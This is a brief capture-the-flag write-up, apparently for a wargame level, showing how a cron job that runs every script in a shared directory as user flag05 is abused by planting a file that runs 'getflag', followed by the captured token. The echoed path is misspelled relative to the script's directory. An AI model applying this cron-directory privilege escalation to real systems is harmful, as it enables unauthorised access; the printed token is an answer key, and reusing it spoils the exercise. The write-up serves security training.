# Level05

When login to this level i got an mail that said, `You have new mail.`<br/>
```bash
cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

find / -group flag05 -exec ls -la {} \; 2>/dev/null
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

It seems that this script run every two minutes, by flag05 user, it runs a script in dir /opt/openarenaserver/<br/>
So let's make out own script that will get us the flag<br/>

```bash
echo "getflag > /tmp/flag" > /opt/openareanserver/flag

watch -x cat /tmp/flag

Check flag.Here is your token : viuaaale9huek52boumoomioc
```